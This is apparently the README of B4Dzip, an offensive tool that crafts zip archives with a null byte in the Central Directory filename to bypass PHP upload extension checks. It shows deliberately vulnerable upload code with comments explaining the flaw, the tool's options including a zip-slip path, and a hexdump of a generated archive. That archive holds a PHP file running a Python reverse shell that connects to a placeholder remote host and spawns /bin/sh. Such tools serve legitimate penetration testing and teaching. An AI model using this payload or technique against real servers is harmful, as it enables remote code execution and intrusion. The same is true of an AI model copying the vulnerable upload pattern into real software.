# B4Dzip

The main purpose of this script is to create a zip file for exploiting File Upload using Null Byte injection. The vulnerability
occurs due to an incorrect validation of the Central Directory Header filename.
<br><br>
More information about ZIP file format can be found [here](https://en.wikipedia.org/wiki/ZIP_(file_format)).

## Vulnerable code example
```php
<?php
if (isset($_POST['submit'])) {
  // Get the uploaded zip file
  $zipFile = $_FILES['zipFile']['tmp_name'];
  if ($_FILES["zipFile"]["size"] > 300000) {
    echo "<p>File size must be less than 300,000 bytes.</p>";
  } else {
    // Create an md5 hash of the zip file
    $fileHash = md5_file($zipFile);
    // Create a new directory for the extracted files
    $uploadDir = "uploads/$fileHash/";
    // Extract the files from the zip
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === true) {
      if ($zip->count() > 1) {
        echo '<p>Please include a single PDF file in the archive.<p>';
      } else {
        /* 
            HERE: Checking the Wiki we find that:

            "If the end of central directory record indicates a non-empty archive (`cdh_size` and `lfh_size` in `badzip.py`),
            the name of each file or directory within the archive should be specified in a central directory entry (`cdh_fname` in `badzip.py`),
            along with other metadata about the entry, and an offset into the ZIP file pointing to the actual entry data.

            ...

            "This allows a file listing of the archive to be performed relatively quickly,
            as the entire archive does not have to be read to see the list of files."

            TL;DR : ZipArchive lib reads file names from Central Directory Header :)
        */
        $fileName = $zip->getNameIndex(0);

        /* 
            HERE: PATHINFO_EXTENSION returns only the last extension, so 'file.php\x00.pdf" will be read as .pdf == "pdf"
            https://manuales.guebs.com/php/function.pathinfo.html
        */
        if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
          mkdir($uploadDir);
          echo exec('7z e ' . $zipFile . ' -o' . $uploadDir . '>/dev/null');
          echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="' . $uploadDir . $fileName . '">' . $uploadDir . $fileName . '</a>' . '</p>';
        } else {
          echo "<p>The unzipped file must have  a .pdf extension.</p>";
        }
      }
    } else {
      echo "Error uploading file.";
    }
  }
}
?>
```

<!-- USAGE EXAMPLES -->
## Usage

```
python3 main.py  --help
usage: B4Dzip [-h] -F FILE -E EXT -P PAYLOAD [-ZS ZIP_SLIP] [-O OUTPUT_FNAME]

Creates a malicious zip file using the given payload as content and injecting NULL Byte in the given
filename, to bypass validations in the Central Directory Header filename.

optional arguments:
  -h, --help            show this help message and exit
  -F FILE, --file FILE  Filename of the file to compress
  -E EXT, --ext EXT     Extension to append after NULL Byte injection.
  -P PAYLOAD, --payload PAYLOAD
                        Payload filepath
  -ZS ZIP_SLIP, --zip-slip ZIP_SLIP
                        Zip Slip parent directory, something like: ../../../
  -O OUTPUT_FNAME, --output-fname OUTPUT_FNAME
                        Output file name
```
## Usage via `runner.sh`

I Highly recommend to use the `runner.sh` file for getting information about usage examples.
The example below shows how a successfull execution of the script should look like.

```
./runner.sh 
b4d.zip saved successfully.


*********** SUMMARY ***********

Archive:  b4d.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      236  2023-08-30 22:43   cc7f82eef39c4d12.php
---------                     -------
      236                     1 file


00000000  50 4b 03 04 0a 00 00 00  00 00 69 b5 1e 57 27 58  |PK........i..W'X|
00000010  57 17 ec 00 00 00 ec 00  00 00 14 00 00 00 63 63  |W.............cc|
00000020  37 66 38 32 65 65 66 33  39 63 34 64 31 32 2e 70  |7f82eef39c4d12.p|
00000030  68 70 3c 3f 70 68 70 20  73 79 73 74 65 6d 28 22  |hp<?php system("|
00000040  65 78 70 6f 72 74 20 52  48 4f 53 54 3d 27 3c 72  |export RHOST='<r|
00000050  68 6f 73 74 3e 27 3b 65  78 70 6f 72 74 20 52 50  |host>';export RP|
00000060  4f 52 54 3d 3c 72 70 6f  72 74 3e 3b 70 79 74 68  |ORT=<rport>;pyth|
00000070  6f 6e 33 20 2d 63 20 5c  22 69 6d 70 6f 72 74 20  |on3 -c \"import |
00000080  73 6f 63 6b 65 74 2c 6f  73 2c 70 74 79 3b 73 3d  |socket,os,pty;s=|
00000090  73 6f 63 6b 65 74 2e 73  6f 63 6b 65 74 28 29 3b  |socket.socket();|
000000a0  73 2e 63 6f 6e 6e 65 63  74 28 28 6f 73 2e 67 65  |s.connect((os.ge|
000000b0  74 65 6e 76 28 27 52 48  4f 53 54 27 29 2c 69 6e  |tenv('RHOST'),in|
000000c0  74 28 6f 73 2e 67 65 74  65 6e 76 28 27 52 50 4f  |t(os.getenv('RPO|
000000d0  52 54 27 29 29 29 29 3b  5b 6f 73 2e 64 75 70 32  |RT'))));[os.dup2|
000000e0  28 73 2e 66 69 6c 65 6e  6f 28 29 2c 66 64 29 20  |(s.fileno(),fd) |
000000f0  66 6f 72 20 66 64 20 69  6e 20 28 30 2c 31 2c 32  |for fd in (0,1,2|
00000100  29 5d 3b 70 74 79 2e 73  70 61 77 6e 28 27 2f 62  |)];pty.spawn('/b|
00000110  69 6e 2f 73 68 27 29 5c  22 22 29 3b 3f 3e 50 4b  |in/sh')\"");?>PK|
00000120  01 02 1e 03 0a 00 00 00  00 00 69 b5 1e 57 27 58  |..........i..W'X|
00000130  57 17 ec 00 00 00 ec 00  00 00 19 00 00 00 00 00  |W...............|
00000140  00 00 00 00 00 00 a4 81  00 00 00 00 63 63 37 66  |............cc7f|
00000150  38 32 65 65 66 33 39 63  34 64 31 32 2e 70 68 70  |82eef39c4d12.php|
00000160  00 2e 70 64 66 50 4b 05  06 00 00 00 00 01 00 01  |..pdfPK.........|
00000170  00 47 00 00 00 1e 01 00  00 00 00                 |.G.........|
0000017b
```


## Meta

Diego Muñoz – [LinkedIn](linkedin.com/in/diegomuñozm)

Distributed under the MIT License. Go to ``LICENSE`` for more information.

[See license](https://github.com/0xCronos/B4Dzip/blob/master/LICENSE)

